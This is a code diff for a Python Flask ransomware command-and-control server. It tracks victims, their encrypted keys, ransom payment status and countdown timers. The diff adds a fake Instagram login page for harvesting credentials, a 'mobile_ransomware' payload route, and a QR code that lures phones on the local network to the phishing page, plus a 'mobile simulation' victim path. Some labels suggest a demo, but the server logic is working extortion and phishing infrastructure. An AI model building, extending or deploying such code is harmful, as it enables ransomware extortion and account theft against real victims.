@@ -3,7 +3,10 @@ import os
 import base64
 import requests
 import datetime
-from flask import Flask, request, jsonify, render_template_string, redirect, url_for
+import io
+import socket
+import qrcode
+from flask import Flask, request, jsonify, render_template_string, redirect, url_for, render_template, send_file
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.backends import default_backend
@@ -145,12 +148,40 @@ def home():
             <div style="text-align: center; margin-top: 20px; color: #555;">
                 <p>Server Online | Listening on Port 5000</p>
                 <p>Use 'DOOMSDAY' to set timer to 1 minute instant panic.</p>
+                <p><a href="/qr" target="_blank" style="color: #00ff00; font-weight: bold;">[GENERATE MOBILE QR CODE]</a></p>
             </div>
         </div>
     </body>
     </html>
     """
     return render_template_string(html)
+
+@app.route('/instagram')
+def instagram_login():
+    return render_template('fake_instagram.html')
+
+@app.route('/mobile_payload')
+def mobile_payload():
+    return render_template('mobile_ransomware.html')
+
+@app.route('/qr')
+def get_qr():
+    # Detect LAN IP to make the QR code work for phones on the same WiFi
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+    except:
+        ip = '127.0.0.1'
+        
+    url = f"http://{ip}:{C2_PORT}/instagram"
+    
+    img = qrcode.make(url)
+    buf = io.BytesIO()
+    img.save(buf)
+    buf.seek(0)
+    return send_file(buf, mimetype='image/png')
 
 @app.route('/api/checkin', methods=['POST'])
 def checkin():
@@ -160,8 +191,24 @@ def checkin():
 
     # Use URL-safe base64 to prevent routing issues with '/' characters
     victim_id = base64.urlsafe_b64encode(os.urandom(8)).decode('utf-8').rstrip('=')
+    
+    # Handle Mobile Simulation (fake key)
+    if encrypted_aes_key_b64 == 'MOBILE_SIMULATION':
+        victims[victim_id] = {
+            "status": "UNPAID",
+            "type": "MOBILE",
+            "encrypted_key": "MOBILE_SIMULATION",
+            "decrypted_key": "MOBILE_UNLOCK_CODE", # Auto-ready once paid
+            "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "timer": 72 * 3600,
+            "ip": request.remote_addr
+        }
+        print(f"[+] New Mobile Victim: {victim_id}")
+        return jsonify({"victim_id": victim_id})
+
     victims[victim_id] = {
         "status": "UNPAID",
+        "type": "DESKTOP",
         "encrypted_key": encrypted_aes_key_b64,
         "decrypted_key": None,
         "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
@@ -184,7 +231,16 @@ def get_status(victim_id):
         if 'pending_timer_update' not in victims[victim_id]:
             victims[victim_id]['timer'] = current_time_left
 
-    response = {"status": "waiting"}
+    # Support server-side countdown (approximate) or client sync
+    # If client sends 'time_left', we update our record
+    client_time = request.json.get('time_left') if request.is_json else None
+    if client_time is not None:
+         victims[victim_id]['timer'] = client_time
+
+    response = {
+        "status": "waiting", 
+        "server_timer": victims[victim_id].get('timer', 72*3600)
+    }
     
     # Check for direct key delivery
     if victims[victim_id]['status'] == 'KEY_SENT' and victims[victim_id].get('decrypted_key'):
@@ -229,6 +285,14 @@ def mark_as_paid(victim_id):
 
     print(f"[*] Marking victim {victim_id} as paid. Decrypting key...")
     encrypted_aes_key_b64 = victim_data['encrypted_key']
+    
+    # Bypass for Mobile Simulation
+    if victim_data.get('type') == 'MOBILE':
+        victims[victim_id]['status'] = 'KEY_SENT'
+        # Decrypted key is already set to dummy value
+        print(f"[+] Mobile unlocking signal ready for {victim_id}")
+        return redirect(url_for('home'))
+
     try:
         encrypted_aes_key = base64.b64decode(encrypted_aes_key_b64)
         aes_key = private_key.decrypt(
